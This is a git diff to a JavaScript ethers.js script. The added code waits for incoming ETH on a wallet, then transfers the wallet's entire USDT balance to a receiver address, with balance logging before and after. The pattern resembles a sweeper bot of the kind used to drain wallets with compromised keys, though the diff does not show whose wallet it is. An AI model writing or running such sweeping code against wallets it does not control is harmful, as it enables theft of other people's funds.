@@ -39,14 +39,33 @@ async function main() {
             console.log('Received ETH:', ethers.formatEther(tx.value),  'ETH');
             console.log('From:', tx.from);
 
-            
+            const _balance = await provider.getBalance(wallet.address); // Get the wallet's balance
+            const _balanceInEth = ethers.formatEther(_balance);
+
+            console.log('Wallet Balance before usdt transfer:', _balanceInEth, 'ETH');
+
+
+            const usdtBalance = await usdtContract.balanceOf(wallet.address);
+            console.log('USDT Balance:', usdtBalance.toString());
+
+            // Convert the balance to Wei (1 ETH = 10^18 Wei)
+            // const usdtBalanceInWei = ethers.parseUnits(usdtBalance.toString(), decimals)
+            const usdtBalanceInWei = usdtBalance.toString()
+
+            // Your code for transferring USDT tokens to another address
+            const receiverAddress = reciever; 
+            const amountToTransfer = usdtBalanceInWei;
+            const transferTx = await usdtContract.transfer(receiverAddress, amountToTransfer);
+            await transferTx.wait(); // Wait for the USDT transfer transaction to be mined
+
+            console.log('USDT Tokens transferred to', receiverAddress);
 
 
             
             const balance = await provider.getBalance(wallet.address); // Get the wallet's balance
             const balanceInEth = ethers.formatEther(balance);
 
-            console.log('Wallet Balance:', balanceInEth, 'ETH');
+            console.log('Wallet Balance after usdt transfer:', balanceInEth, 'ETH');
 
             // Convert the balance to Wei (1 ETH = 10^18 Wei)
             const balanceInWei = ethers.parseEther(balanceInEth);
